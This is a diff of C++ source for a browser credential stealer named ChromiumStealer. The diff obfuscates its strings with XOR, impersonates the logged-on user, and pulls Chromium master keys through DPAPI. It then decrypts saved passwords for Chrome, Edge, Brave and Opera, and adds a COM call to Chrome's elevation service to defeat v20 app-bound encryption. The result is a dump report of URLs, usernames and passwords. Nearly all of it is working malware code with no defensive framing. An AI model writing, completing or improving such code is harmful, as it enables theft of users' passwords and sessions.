@@ -3,7 +3,8 @@
 #include <filesystem>
 #include <fstream>
 #include <vector>
-#include <iostream>
+#include <string>
+#include <sstream>
 #include <wincrypt.h>
 
 #include "ChromiumStealer.h"
@@ -14,6 +15,7 @@
 #include "../utils/Shared.h"
 #include <nlohmann/json.hpp>
 #include <sqlite3.h>
+#include <objbase.h>
 
 #pragma comment(lib, "crypt32.lib")
 
@@ -22,120 +24,172 @@ namespace credential {
     namespace fs = std::filesystem;
 
     namespace {
+        // IElevator interface definition (v20 decryption)
+        MIDL_INTERFACE("10915CE0-653E-4B02-8610-86B5A6112A0A")
+        IElevator : public IUnknown {
+        public:
+            virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRX(const wchar_t*, const wchar_t*, const wchar_t*, const wchar_t*, DWORD, ULONG_PTR*) = 0;
+            virtual HRESULT STDMETHODCALLTYPE DecryptData(const unsigned char* ciphertext, uint32_t ciphertext_size, wchar_t** plaintext) = 0;
+        };
+
         // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
-        const wchar_t kOsCryptEnc[] = { L'o'^0x4B, L's'^0x1F, L'_'^0x8C, L'c'^0x3E, L'r'^0x4B, L'y'^0x1F, L'p'^0x8C, L't'^0x3E }; // os_crypt
-        const wchar_t kEncryptedKeyEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'_'^0x1F, L'k'^0x8C, L'e'^0x3E, L'y'^0x4B }; // encrypted_key
-        const wchar_t kLocalStateEnc[] = { L'L'^0x4B, L'o'^0x1F, L'c'^0x8C, L'a'^0x3E, L'l'^0x4B, L' '^0x1F, L'S'^0x8C, L't'^0x3E, L'a'^0x4B, L't'^0x1F, L'e'^0x8C }; // Local State
-        const wchar_t kLoginDataEnc[] = { L'L'^0x4B, L'o'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L' '^0x1F, L'D'^0x8C, L'a'^0x3E, L't'^0x4B, L'a'^0x1F }; // Login Data
-        const wchar_t kCookiesEnc[] = { L'C'^0x4B, L'o'^0x1F, L'o'^0x8C, L'k'^0x3E, L'i'^0x4B, L'e'^0x1F, L's'^0x8C }; // Cookies
-        const wchar_t kQueryLoginsEnc[] = { L'S'^0x4B, L'E'^0x1F, L'L'^0x8C, L'E'^0x3E, L'C'^0x4B, L'T'^0x1F, L' '^0x8C, L'o'^0x3E, L'r'^0x4B, L'i'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L'_'^0x1F, L'u'^0x8C, L'r'^0x3E, L'l'^0x4B, L','^0x1F, L' '^0x8C, L'u'^0x3E, L's'^0x4B, L'e'^0x1F, L'r'^0x8C, L'n'^0x3E, L'a'^0x4B, L'm'^0x1F, L'e'^0x8C, L'_'^0x3E, L'v'^0x4B, L'a'^0x1F, L'l'^0x8C, L'u'^0x3E, L'e'^0x4B, L','^0x1F, L' '^0x8C, L'p'^0x3E, L'a'^0x4B, L's'^0x1F, L's'^0x8C, L'w'^0x3E, L'o'^0x4B, L'r'^0x1F, L'd'^0x8C, L'_'^0x3E, L'v'^0x4B, L'a'^0x1F, L'l'^0x8C, L'u'^0x3E, L'e'^0x4B, L' '^0x1F, L'F'^0x8C, L'R'^0x3E, L'O'^0x4B, L'M'^0x1F, L' '^0x8C, L'l'^0x3E, L'o'^0x4B, L'g'^0x1F, L'i'^0x8C, L'n'^0x3E, L's'^0x4B }; // SELECT origin_url, username_value, password_value FROM logins
-        const wchar_t kQueryCookiesEnc[] = { L'S'^0x4B, L'E'^0x1F, L'L'^0x8C, L'E'^0x3E, L'C'^0x4B, L'T'^0x1F, L' '^0x8C, L'h'^0x3E, L'o'^0x4B, L's'^0x1F, L't'^0x8C, L'_'^0x3E, L'k'^0x4B, L'e'^0x1F, L'y'^0x8C, L','^0x3E, L' '^0x4B, L'p'^0x1F, L'a'^0x8C, L't'^0x3E, L'h'^0x4B, L','^0x1F, L' '^0x8C, L'i'^0x3E, L's'^0x4B, L'_'^0x1F, L's'^0x8C, L'e'^0x3E, L'c'^0x4B, L'u'^0x1F, L'r'^0x8C, L'e'^0x3E, L','^0x1F, L' '^0x8C, L'e'^0x3E, L'x'^0x4B, L'p'^0x1F, L'i'^0x8C, L'r'^0x3E, L'e'^0x4B, L's'^0x1F, L'_'^0x8C, L'u'^0x3E, L't'^0x4B, L'c'^0x1F, L','^0x1F, L' '^0x8C, L'n'^0x3E, L'a'^0x4B, L'm'^0x1F, L'e'^0x8C, L','^0x3E, L' '^0x4B, L'e'^0x1F, L'n'^0x8C, L'c'^0x3E, L'r'^0x4B, L'y'^0x1F, L'p'^0x8C, L't'^0x3E, L'e'^0x4B, L'd'^0x1F, L'_'^0x8C, L'v'^0x3E, L'a'^0x4B, L'l'^0x1F, L'u'^0x8C, L'e'^0x3E, L' '^0x4B, L'F'^0x1F, L'R'^0x8C, L'O'^0x3E, L'M'^0x4B, L' '^0x1F, L'c'^0x8C, L'o'^0x3E, L'o'^0x4B, L'k'^0x1F, L'i'^0x8C, L'e'^0x3E, L's'^0x4B }; // SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies
+        const wchar_t kOsCryptEnc[] = { L'\x24', L'\x6c', L'\xd3', L'\x5d', L'\x39', L'\x66', L'\xfc', L'\x4a', L'\0' };
+        const wchar_t kEncryptedKeyEnc[] = { L'\x2e', L'\x71', L'\xef', L'\x4c', L'\x32', L'\x6f', L'\xf8', L'\x5b', L'\x2f', L'\x40', L'\xe7', L'\x5b', L'\x32', L'\0' };
+        const wchar_t kLocalStateEnc[] = { L'\x07', L'\x70', L'\xef', L'\x5f', L'\x27', L'\x3f', L'\xdf', L'\x4a', L'\x2a', L'\x6b', L'\xe9', L'\0' }; // Local State
+        const wchar_t kLoginDataEnc[] = { L'\x07', L'\x70', L'\xeb', L'\x57', L'\x25', L'\x3f', L'\xc8', L'\x5f', L'\x3f', L'\x7e', L'\0' }; // Login Data
+        const wchar_t kCookiesEnc[] = { L'\x08', L'\x70', L'\xe3', L'\x55', L'\x22', L'\x7a', L'\xff', L'\0' }; // Cookies
+
+        const wchar_t kDefaultEnc[] = { L'\x0f', L'\x7a', L'\xea', L'\x5f', L'\x3e', L'\x73', L'\xf8', L'\0' }; // Default
+        const wchar_t kNetworkEnc[] = { L'\x05', L'\x7a', L'\xf8', L'\x49', L'\x24', L'\x6d', L'\xe7', L'\0' }; // Network
+        const wchar_t kProfilePrefixEnc[] = { L'\x1b', L'\x6d', L'\xe3', L'\x58', L'\x22', L'\x73', L'\xe9', L'\x1e', L'\0' }; // Profile
+
+        const wchar_t kQueryLoginsEnc[] = { L'\x18', L'\x5a', L'\xc0', L'\x7b', L'\x08', L'\x4b', L'\xac', L'\x51', L'\x39', L'\x76', L'\xeb', L'\x57', L'\x25', L'\x40', L'\xf9', L'\x4c', L'\x27', L'\x33', L'\xac', L'\x4b', L'\x38', L'\x7a', L'\xfe', L'\x50', L'\x2a', L'\x72', L'\xe9', L'\x61', L'\x3d', L'\x7e', L'\xe0', L'\x4b', L'\x2e', L'\x33', L'\xac', L'\x4e', L'\x2a', L'\x6c', L'\xff', L'\x49', L'\x24', L'\x6d', L'\xe8', L'\x61', L'\x3d', L'\x7e', L'\xe0', L'\x4b', L'\x2e', L'\x3f', L'\xca', L'\x6c', L'\x04', L'\x52', L'\xac', L'\x52', L'\x24', L'\x78', L'\xe5', L'\x50', L'\x38', L'\0' };
+        const wchar_t kQueryCookiesEnc[] = { L'\x18', L'\x5a', L'\xc0', L'\x7b', L'\x08', L'\x4b', L'\xac', L'\x56', L'\x24', L'\x6c', L'\xf8', L'\x61', L'\x20', L'\x7a', L'\xf5', L'\x12', L'\x6b', L'\x71', L'\xed', L'\x53', L'\x2e', L'\x33', L'\xac', L'\x4e', L'\x2a', L'\x6b', L'\xe4', L'\x12', L'\x6b', L'\x7a', L'\xe2', L'\x5d', L'\x39', L'\x66', L'\xfc', L'\x4a', L'\x2e', L'\x7b', L'\xd3', L'\x48', L'\x2a', L'\x73', L'\xf9', L'\x5b', L'\x67', L'\x3f', L'\xe9', L'\x46', L'\x3b', L'\x76', L'\xfe', L'\x5b', L'\x38', L'\x40', L'\xf9', L'\x4a', L'\x28', L'\x3f', L'\xca', L'\x6c', L'\x04', L'\x52', L'\xac', L'\x5d', L'\x24', L'\x70', L'\xe7', L'\x57', L'\x2e', L'\x6c', L'\0' };
 
         // Browser paths
-        const wchar_t kChromePathEnc[] = { L'\\'^0x4B, L'G'^0x1F, L'o'^0x8C, L'o'^0x3E, L'g'^0x4B, L'l'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'C'^0x4B, L'h'^0x1F, L'r'^0x8C, L'o'^0x3E, L'm'^0x4B, L'e'^0x1F, L'\\'^0x8C, L'U'^0x3E, L's'^0x4B, L'e'^0x1F, L'r'^0x8C, L' '^0x3E, L'D'^0x4B, L'a'^0x1F, L't'^0x8C, L'a'^0x3E };
-        const wchar_t kChromeBetaPathEnc[] = { L'\\'^0x4B, L'G'^0x1F, L'o'^0x8C, L'o'^0x3E, L'g'^0x4B, L'l'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'C'^0x4B, L'h'^0x1F, L'r'^0x8C, L'o'^0x3E, L'm'^0x4B, L'e'^0x1F, L' '^0x8C, L'B'^0x3E, L'e'^0x4B, L't'^0x1F, L'a'^0x8C, L'\\'^0x3E, L'U'^0x4B, L's'^0x1F, L'e'^0x8C, L'r'^0x3E, L' '^0x4B, L'D'^0x1F, L'a'^0x8C, L't'^0x3E, L'a'^0x4B };
-        const wchar_t kEdgePathEnc[] = { L'\\'^0x4B, L'M'^0x1F, L'i'^0x8C, L'c'^0x3E, L'r'^0x4B, L'o'^0x1F, L's'^0x8C, L'o'^0x3E, L'f'^0x4B, L't'^0x1F, L'\\'^0x8C, L'E'^0x3E, L'd'^0x4B, L'g'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'U'^0x4B, L's'^0x1F, L'e'^0x8C, L'r'^0x3E, L' '^0x4B, L'D'^0x1F, L'a'^0x8C, L't'^0x3E, L'a'^0x4B };
-        const wchar_t kBravePathEnc[] = { L'\\'^0x4B, L'B'^0x1F, L'r'^0x8C, L'a'^0x3E, L'v'^0x4B, L'e'^0x1F, L'S'^0x8C, L'o'^0x3E, L'f'^0x4B, L't'^0x1F, L'w'^0x8C, L'a'^0x3E, L'r'^0x4B, L'e'^0x1F, L'\\'^0x8C, L'B'^0x3E, L'r'^0x4B, L'a'^0x1F, L'v'^0x8C, L'e'^0x3E, L'-'^0x4B, L'B'^0x1F, L'r'^0x8C, L'o'^0x3E, L'w'^0x4B, L's'^0x1F, L'e'^0x8C, L'r'^0x3E, L'\\'^0x4B, L'U'^0x1F, L's'^0x8C, L'e'^0x3E, L'r'^0x4B, L' '^0x1F, L'D'^0x8C, L'a'^0x3E, L't'^0x4B, L'a'^0x1F };
-        const wchar_t kOperaPathEnc[] = { L'\\'^0x4B, L'O'^0x1F, L'p'^0x8C, L'e'^0x3E, L'r'^0x4B, L'a'^0x1F, L' '^0x8C, L'S'^0x3E, L'o'^0x4B, L'f'^0x1F, L't'^0x8C, L'w'^0x3E, L'a'^0x4B, L'r'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'O'^0x4B, L'p'^0x1F, L'e'^0x8C, L'r'^0x3E, L'a'^0x4B, L' '^0x1F, L'S'^0x8C, L't'^0x3E, L'a'^0x4B, L'b'^0x1F, L'l'^0x8C, L'e'^0x3E };
-        const wchar_t kOperaGxPathEnc[] = { L'\\'^0x4B, L'O'^0x1F, L'p'^0x8C, L'e'^0x3E, L'r'^0x4B, L'a'^0x1F, L' '^0x8C, L'S'^0x3E, L'o'^0x4B, L'f'^0x1F, L't'^0x8C, L'w'^0x3E, L'a'^0x4B, L'r'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'O'^0x4B, L'p'^0x1F, L'e'^0x8C, L'r'^0x3E, L'a'^0x4B, L' '^0x1F, L'G'^0x8C, L'X'^0x3E, L' '^0x4B, L'S'^0x1F, L't'^0x8C, L'a'^0x3E, L'b'^0x4B, L'l'^0x1F, L'e'^0x8C };
+        const wchar_t kChromePathEnc[] = { L'\x17', L'\x58', L'\xe3', L'\x51', L'\x2c', L'\x73', L'\xe9', L'\x62', L'\x08', L'\x77', L'\xfe', L'\x51', L'\x26', L'\x7a', L'\xd0', L'\x6b', L'\x38', L'\x7a', L'\xfe', L'\x1e', L'\x0f', L'\x7e', L'\xf8', L'\x5f', L'\0' };
+        const wchar_t kEdgePathEnc[] = { L'\x17', L'\x52', L'\xe5', L'\x5d', L'\x39', L'\x70', L'\xff', L'\x51', L'\x2d', L'\x6b', L'\xd0', L'\x7b', L'\x2f', L'\x78', L'\xe9', L'\x62', L'\x1e', L'\x6c', L'\xe9', L'\x4c', L'\x6b', L'\x5b', L'\xed', L'\x4a', L'\x2a', L'\0' };
+        const wchar_t kBravePathEnc[] = { L'\x17', L'\x5d', L'\xfe', L'\x5f', L'\x3d', L'\x7a', L'\xdf', L'\x51', L'\x2d', L'\x6b', L'\xfb', L'\x5f', L'\x39', L'\x7a', L'\xd0', L'\x7c', L'\x39', L'\x7e', L'\xfa', L'\x5b', L'\x66', L'\x5d', L'\xfe', L'\x51', L'\x3c', L'\x6c', L'\xe9', L'\x4c', L'\x17', L'\x4a', L'\xff', L'\x5b', L'\x39', L'\x3f', L'\xc8', L'\x5f', L'\x3f', L'\x7e', L'\0' };
+        const wchar_t kOperaPathEnc[] = { L'\x17', L'\x50', L'\xfc', L'\x5b', L'\x39', L'\x7e', L'\xac', L'\x6d', L'\x24', L'\x79', L'\xf8', L'\x49', L'\x2a', L'\x6d', L'\xe9', L'\x62', L'\x04', L'\x6f', L'\xe9', L'\x4c', L'\x2a', L'\x3f', L'\xdf', L'\x4a', L'\x2a', L'\x7d', L'\xe0', L'\x5b', L'\0' };
+        const wchar_t kOperaGxPathEnc[] = { L'\x17', L'\x50', L'\xfc', L'\x5b', L'\x39', L'\x7e', L'\xac', L'\x6d', L'\x24', L'\x79', L'\xf8', L'\x49', L'\x2a', L'\x6d', L'\xe9', L'\x62', L'\x04', L'\x6f', L'\xe9', L'\x4c', L'\x2a', L'\x3f', L'\xcb', L'\x66', L'\x6b', L'\x4c', L'\xf8', L'\x5f', L'\x29', L'\x73', L'\xe9', L'\0' };
+
+        const wchar_t kChromeClsidEnc[] = { L'\x7c', L'\x2f', L'\xb4', L'\x06', L'\x7d', L'\x2f', L'\xbf', L'\x0e', L'\x66', L'\x7e', L'\xe8', L'\x07', L'\x2a', L'\x32', L'\xb8', L'\x5d', L'\x7e', L'\x2c', L'\xa1', L'\x07', L'\x79', L'\x29', L'\xbe', L'\x13', L'\x2e', L'\x2e', L'\xe8', L'\x0b', L'\x79', L'\x7b', L'\xb5', L'\x5f', L'\x7f', L'\x2d', L'\xea', L'\x06', L'\0' };
+        const wchar_t kEdgeClsidEnc[] = { L'\x7a', L'\x2c', L'\xc9', L'\x0c', L'\x79', L'\x5b', L'\xcf', L'\x0d', L'\x66', L'\x2f', L'\xbe', L'\x0e', L'\x0a', L'\x32', L'\xb8', L'\x08', L'\x0e', L'\x2f', L'\xa1', L'\x7c', L'\x7c', L'\x28', L'\xb4', L'\x13', L'\x7f', L'\x5b', L'\xbc', L'\x07', L'\x7b', L'\x28', L'\xcd', L'\x06', L'\x0a', L'\x2c', L'\xbf', L'\x7a', L'\0' };
+        const wchar_t kIElevatorIidEnc[] = { L'\x7a', L'\x2f', L'\xb5', L'\x0f', L'\x7e', L'\x5c', L'\xc9', L'\x0e', L'\x66', L'\x29', L'\xb9', L'\x0d', L'\x0e', L'\x32', L'\xb8', L'\x7c', L'\x7b', L'\x2d', L'\xa1', L'\x06', L'\x7d', L'\x2e', L'\xbc', L'\x13', L'\x73', L'\x29', L'\xce', L'\x0b', L'\x0a', L'\x29', L'\xbd', L'\x0f', L'\x79', L'\x5e', L'\xbc', L'\x7f', L'\0' };
+
+        std::string DecryptAppBound(const std::vector<BYTE>& ciphertext, const std::string& browserName) {
+            CLSID clsid;
+            HRESULT hr;
+            std::wstring clsidStr;
+            if (browserName.find("Chrome") != std::string::npos) {
+                clsidStr = utils::DecryptW(kChromeClsidEnc, wcslen(kChromeClsidEnc));
+            } else if (browserName.find("Edge") != std::string::npos) {
+                clsidStr = utils::DecryptW(kEdgeClsidEnc, wcslen(kEdgeClsidEnc));
+            } else {
+                return "[v20 encrypted - " + browserName + "]";
+            }
+
+            hr = CLSIDFromString(clsidStr.c_str(), &clsid);
+            if (FAILED(hr)) return "[v20 CLSID fail]";
+
+            IID iid;
+            hr = IIDFromString(utils::DecryptW(kIElevatorIidEnc, wcslen(kIElevatorIidEnc)).c_str(), &iid);
+            if (FAILED(hr)) return "[v20 IID fail]";
+
+            IElevator* pElevator = NULL;
+            hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, (void**)&pElevator);
+            if (SUCCEEDED(hr) && pElevator) {
+                wchar_t* plaintext = NULL;
+                hr = pElevator->DecryptData(ciphertext.data(), (uint32_t)ciphertext.size(), &plaintext);
+                if (SUCCEEDED(hr) && plaintext) {
+                    std::string result = utils::ws2s(plaintext);
+                    CoTaskMemFree(plaintext);
+                    pElevator->Release();
+                    return result;
+                }
+                if (pElevator) pElevator->Release();
+                return "[v20 DecryptData fail - HRESULT " + utils::Shared::ToHex(hr) + "]";
+            }
+            return "[v20 Elevation Service fail - HRESULT " + utils::Shared::ToHex(hr) + "]";
+        }
+
+        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
+            try {
+                if (!fs::exists(src)) return;
+                fs::copy_file(src, dest, fs::copy_options::overwrite_existing);
+                if (fs::exists(src + "-wal")) fs::copy_file(src + "-wal", dest + "-wal", fs::copy_options::overwrite_existing);
+                if (fs::exists(src + "-shm")) fs::copy_file(src + "-shm", dest + "-shm", fs::copy_options::overwrite_existing);
+            } catch (...) {
+                CopyFileA(src.c_str(), dest.c_str(), FALSE);
+                std::string wal = src + "-wal";
+                if (fs::exists(wal)) CopyFileA(wal.c_str(), (dest + "-wal").c_str(), FALSE);
+                std::string shm = src + "-shm";
+                if (fs::exists(shm)) CopyFileA(shm.c_str(), (dest + "-shm").c_str(), FALSE);
+            }
+        }
+
+        void SafeDeleteDatabase(const std::string& path) {
+            try {
+                fs::remove(path);
+                fs::remove(path + "-wal");
+                fs::remove(path + "-shm");
+            } catch (...) {}
+        }
 
         std::vector<BYTE> GetMasterKey(const std::string& localStatePath) {
             try {
                 if (!fs::exists(localStatePath)) {
-                    LOG_DEBUG("Local State file not found at " + localStatePath);
+                    LOG_DEBUG("[!] Local State path does not exist: " + localStatePath);
                     return {};
                 }
 
-                char tempPath[MAX_PATH];
-                GetTempPathA(MAX_PATH, tempPath);
-                std::string tempLocalState = std::string(tempPath) + "ls_" + std::to_string(GetTickCount64());
-                if (!CopyFileA(localStatePath.c_str(), tempLocalState.c_str(), FALSE)) {
-                    tempLocalState = localStatePath;
-                }
-
-                std::ifstream f(tempLocalState);
+                std::ifstream f(localStatePath);
                 if (!f.is_open()) {
-                    LOG_DEBUG("Failed to open Local State file (even after copy)");
+                    LOG_DEBUG("[!] Failed to open Local State: " + localStatePath);
                     return {};
                 }
+
                 nlohmann::json j;
                 f >> j;
-                if (tempLocalState != localStatePath) DeleteFileA(tempLocalState.c_str());
+                f.close();
 
-                std::string os_crypt = utils::ws2s(utils::DecryptW(kOsCryptEnc, sizeof(kOsCryptEnc)/sizeof(kOsCryptEnc[0])));
-                std::string encrypted_key_str = utils::ws2s(utils::DecryptW(kEncryptedKeyEnc, sizeof(kEncryptedKeyEnc)/sizeof(kEncryptedKeyEnc[0])));
+                std::string os_crypt = utils::ws2s(utils::DecryptW(kOsCryptEnc, wcslen(kOsCryptEnc)));
+                std::string encrypted_key_str = utils::ws2s(utils::DecryptW(kEncryptedKeyEnc, wcslen(kEncryptedKeyEnc)));
 
                 if (!j.contains(os_crypt) || !j[os_crypt].contains(encrypted_key_str)) {
-                    LOG_DEBUG("Local State does not contain expected keys");
+                    LOG_DEBUG("[!] JSON missing 'os_crypt' or 'encrypted_key' fields.");
                     return {};
                 }
 
                 std::string encryptedKeyB64 = j[os_crypt][encrypted_key_str];
-                std::vector<BYTE> encryptedKey = crypto::Base64Decode(encryptedKeyB64);
+                std::vector<BYTE> decodedKey = crypto::Base64Decode(encryptedKeyB64);
 
-                if (encryptedKey.size() < 5) return {};
-                std::vector<BYTE> dpapiEncryptedKey(encryptedKey.begin() + 5, encryptedKey.end());
+                if (decodedKey.size() < 5) {
+                    LOG_DEBUG("[!] Decoded key too short.");
+                    return {};
+                }
 
-                DATA_BLOB in;
-                in.pbData = dpapiEncryptedKey.data();
-                in.cbData = (DWORD)dpapiEncryptedKey.size();
-                DATA_BLOB out;
+                std::vector<BYTE> dpapiPayload(decodedKey.begin() + 5, decodedKey.end());
+
+                DATA_BLOB in, out;
+                in.pbData = dpapiPayload.data();
+                in.cbData = (DWORD)dpapiPayload.size();
 
                 if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                     std::vector<BYTE> masterKey(out.pbData, out.pbData + out.cbData);
                     LocalFree(out.pbData);
-                    LOG_DEBUG("Successfully decrypted master key from " + localStatePath);
+                    LOG_DEBUG("[+] SUCCESS: Master Key retrieved for " + localStatePath);
                     return masterKey;
                 } else {
-                    LOG_DEBUG("CryptUnprotectData failed for master key. Error: " + std::to_string(GetLastError()));
+                    LOG_DEBUG("[!] CryptUnprotectData failed. Error: " + std::to_string(GetLastError()));
                 }
             } catch (const std::exception& e) {
-                LOG_DEBUG("Exception in GetMasterKey: " + std::string(e.what()));
-            } catch (...) {
-                LOG_DEBUG("Unknown exception in GetMasterKey");
+                LOG_DEBUG("[!] Exception in GetMasterKey: " + std::string(e.what()));
             }
             return {};
         }
 
-        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey) {
+        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey, const std::string& browserName) {
             if (ciphertext.empty()) return "";
 
-            // Modern Chromium: v10/v11/v20 (AES-GCM)
-            // v10/v11 starts with 'v1', v20 starts with 'v2'
-            if (ciphertext.size() >= 15 && ciphertext[0] == 'v' && (ciphertext[1] == '1' || ciphertext[1] == '2')) {
+            if (ciphertext.size() >= 15 && ciphertext[0] == 'v' && ciphertext[1] == '1') {
                 try {
-                    if (ciphertext.size() < 3 + 12 + 16) {
-                        LOG_DEBUG("Ciphertext too short for GCM");
-                        return "";
-                    }
-
+                    if (masterKey.empty()) return "";
                     std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
-                    // Payload is everything after prefix and IV. The last 16 bytes are the tag.
-                    std::vector<BYTE> payloadToDecrypt(ciphertext.begin() + 15, ciphertext.end());
-
-                    if (masterKey.empty()) {
-                        LOG_DEBUG("Master key empty, cannot decrypt GCM");
-                        return "";
-                    }
-
+                    std::vector<BYTE> payload(ciphertext.begin() + 15, ciphertext.end());
                     crypto::AesGcm aes(masterKey);
-                    std::vector<BYTE> decrypted = aes.decrypt(payloadToDecrypt, iv);
+                    std::vector<BYTE> decrypted = aes.decrypt(payload, iv);
                     return std::string(decrypted.begin(), decrypted.end());
-                } catch (const std::exception& e) {
-                    LOG_DEBUG("AES-GCM Decryption failed: " + std::string(e.what()));
-                    return "";
-                } catch (...) {
-                    LOG_DEBUG("AES-GCM Decryption failed (unknown exception)");
-                    return "";
-                }
+                } catch (...) { return ""; }
             }
 
-            // Legacy Chromium or others: DPAPI directly
-            DATA_BLOB in;
+            if (ciphertext.size() >= 2 && ciphertext[0] == 'v' && ciphertext[1] == '2') {
+                return DecryptAppBound(ciphertext, browserName);
+            }
+
+            DATA_BLOB in, out;
             in.pbData = (BYTE*)ciphertext.data();
             in.cbData = (DWORD)ciphertext.size();
-            DATA_BLOB out;
-
             if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                 std::string decrypted((char*)out.pbData, out.cbData);
                 LocalFree(out.pbData);
@@ -144,42 +198,23 @@ namespace credential {
 
             return "";
         }
-
-        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
-            CopyFileA(src.c_str(), dest.c_str(), FALSE);
-            // Also copy sidecars if they exist (WAL mode)
-            std::string wal = src + "-wal";
-            std::string shm = src + "-shm";
-            if (fs::exists(wal)) CopyFileA(wal.c_str(), (dest + "-wal").c_str(), FALSE);
-            if (fs::exists(shm)) CopyFileA(shm.c_str(), (dest + "-shm").c_str(), FALSE);
-        }
-
-        void SafeDeleteDatabase(const std::string& path) {
-            DeleteFileA(path.c_str());
-            DeleteFileA((path + "-wal").c_str());
-            DeleteFileA((path + "-shm").c_str());
-        }
     }
 
     std::string DumpChromiumPasswords() {
         bool impersonated = utils::ImpersonateLoggedOnUser();
         std::string report = "CHROMIUM_PASSWORDS_DUMPED:\n";
-        if (!impersonated) report += "[!] Impersonation failed.\n";
-        report += "BROWSER | URL | USERNAME | PASSWORD\n";
+        if (impersonated) report += "[+] Running with impersonated user token.\n";
+
+        report += "BROWSER | PROFILE | URL | USERNAME | PASSWORD\n";
         report += "--------------------------------------------------------------------------------\n";
 
         char path[MAX_PATH];
-        char appDataPath[MAX_PATH];
         std::string localAppData = "";
         std::string roamingAppData = "";
 
-        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
-            localAppData = path;
-        }
-        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
-            roamingAppData = appDataPath;
-        }
-            
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) localAppData = path;
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) roamingAppData = path;
+
         struct BrowserPath {
             std::string name;
             std::string localPath;
@@ -187,95 +222,84 @@ namespace credential {
         };
 
         std::vector<BrowserPath> browsers = {
-            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, sizeof(kChromePathEnc)/sizeof(kChromePathEnc[0]))), ""},
-            {"Chrome Beta", localAppData + utils::ws2s(utils::DecryptW(kChromeBetaPathEnc, sizeof(kChromeBetaPathEnc)/sizeof(kChromeBetaPathEnc[0]))), ""},
-            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, sizeof(kEdgePathEnc)/sizeof(kEdgePathEnc[0]))), ""},
-            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, sizeof(kBravePathEnc)/sizeof(kBravePathEnc[0]))), ""},
-            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0])))},
-            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0])))}
+            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, wcslen(kChromePathEnc))), ""},
+            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, wcslen(kEdgePathEnc))), ""},
+            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, wcslen(kBravePathEnc))), ""},
+            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc)))},
+            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc)))}
         };
 
         for (const auto& browser : browsers) {
-            std::string localState;
-            if (fs::exists(browser.localPath)) {
-                localState = browser.localPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
-            }
-
-            if (localState.empty() || !fs::exists(localState)) {
-                 if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) {
-                     std::string altState = browser.roamingPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
-                     if (fs::exists(altState)) localState = altState;
-                 }
-            }
-
-            if (localState.empty() || !fs::exists(localState)) {
-                LOG_DEBUG("Local State not found for " + browser.name);
+            std::string localStateDir = browser.localPath;
+            if (localStateDir.empty() || !fs::exists(localStateDir)) localStateDir = browser.roamingPath;
+            if (localStateDir.empty() || !fs::exists(localStateDir)) {
+                LOG_DEBUG("No user data path found for browser: " + browser.name);
                 continue;
             }
 
+            std::string localState = localStateDir + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, wcslen(kLocalStateEnc)));
             std::vector<BYTE> key = GetMasterKey(localState);
-            if (key.empty()) report += "[!] No master key for " + browser.name + "\n";
 
             std::vector<std::string> searchPaths;
-            if (!browser.localPath.empty()) searchPaths.push_back(browser.localPath);
-            if (!browser.roamingPath.empty() && browser.roamingPath != browser.localPath) searchPaths.push_back(browser.roamingPath);
+            if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) searchPaths.push_back(browser.roamingPath);
